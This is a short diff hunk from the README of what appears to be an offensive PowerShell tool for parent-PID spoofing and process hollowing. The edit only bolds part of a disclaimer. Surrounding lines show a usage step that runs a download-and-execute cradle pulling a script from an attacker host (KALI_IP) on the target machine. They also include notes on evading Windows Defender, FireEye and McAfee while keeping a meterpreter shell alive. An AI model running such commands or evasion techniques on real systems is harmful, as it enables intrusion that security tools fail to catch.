@@ -47,7 +47,7 @@ YouTube (higher resolution): https://www.youtube.com/watch?v=GB59m-KJvd0
 4. On your target machine `powershell -ep Bypass -c IEX(New-Object System.Net.WebClient).DownloadString('http://KALI_IP:8088/PPIDxProcHollow_v1.1.ps1')`
 
 ## Disclaimer
-The usage section might make it seem like a 'fileless' approach but it does write temporarly artifacts to disk. I know disk is lava🔥 but writing it this way seems to evade Window Defender/FireEye/McAfee😨
+The usage section might make it seem like a 'fileless' approach but it **does write temporarly artifacts to disk**. I know disk is lava🔥 but writing it this way seems to evade Window Defender/FireEye/McAfee😨
 
 ## Evading Windows Defender
 - The v1.0 script creates an alert on Windows Defender upon launching cmd.exe from meterpreter shell. However, your meterpreter shell will still be **kept alive** despite the alert.
